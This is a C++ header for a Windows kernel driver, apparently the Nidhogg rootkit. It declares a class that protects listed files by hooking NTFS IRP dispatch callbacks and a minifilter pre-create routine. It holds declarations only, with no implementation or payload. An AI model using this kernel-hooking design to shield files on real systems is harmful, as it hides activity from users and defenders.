#pragma once
#include "pch.h"
#include "PushLock.h"
#include "IoctlShared.h"
#include "MemoryHelper.h"
#include "MemoryAllocator.hpp"

extern "C" {
	#include "WindowsTypes.h"
	#include "NidhoggCommon.h"
}
#include "FileHelper.h"
#include "RundownProtection.h"
#include "ListHelper.hpp"

// Definitions.
constexpr SIZE_T SUPPORTED_HOOKED_NTFS_CALLBACKS = IRP_MJ_MAXIMUM_FUNCTION;

struct FileItem {
	LIST_ENTRY Entry;
	WCHAR FilePath[MAX_PATH];
	ULONG FileLength;
	USHORT NormalizedLength;
	WCHAR NormalizedPath[MAX_PATH];
};

struct SearchedFile {
	WCHAR* Path;
	SIZE_T Size;
	bool Exact;
};

struct FilesList {
	SIZE_T Count;
	PushLock Lock;
	PLIST_ENTRY Items;
};

struct NtfsCallback {
	PVOID Address;
	bool Activated;
};

class FileHandler {
private:
	FilesList protectedFiles;
	NtfsCallback callbacks[SUPPORTED_HOOKED_NTFS_CALLBACKS];
	RundownProtection rundown;

public:
	void* operator new(size_t size) noexcept {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(APC_LEVEL)
	FileHandler();

	_IRQL_requires_same_
	_IRQL_requires_(PASSIVE_LEVEL)
	~FileHandler();

	_IRQL_requires_max_(APC_LEVEL)
	bool FindFile(_In_ WCHAR* path, _In_ FileType type, _In_ bool exact = true) const;

	_IRQL_requires_max_(APC_LEVEL)
	_IRQL_requires_same_
	bool FindNormalizedFile(_In_ PCUNICODE_STRING path) const;

	_IRQL_requires_max_(APC_LEVEL)
	bool ProtectFile(_In_ WCHAR* path);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveFile(_In_ WCHAR* path, _In_ FileType type);

	_IRQL_requires_max_(APC_LEVEL)
	void ClearFilesList(_In_ FileType type);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListProtectedFiles(_Inout_ IoctlFileList* filesList);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS InstallNtfsHook(_In_ ULONG irpMjFunction);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS UninstallNtfsHook(_In_ ULONG irpMjFunction);

	_IRQL_requires_max_(APC_LEVEL)
	PVOID GetNtfsCallback(_In_ ULONG index) const;

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool AcquireRundown();

	_IRQL_requires_max_(DISPATCH_LEVEL)
	void ReleaseRundown();
};

inline FileHandler* NidhoggFileHandler;

_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS HookedNtfsIrpCreate(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp);

_IRQL_requires_max_(APC_LEVEL)
_IRQL_requires_same_
FLT_PREOP_CALLBACK_STATUS NidhoggPreCreate(_Inout_ PFLT_CALLBACK_DATA Data,
	_In_ PCFLT_RELATED_OBJECTS FltObjects, _Flt_CompletionContext_Outptr_ PVOID* CompletionContext);
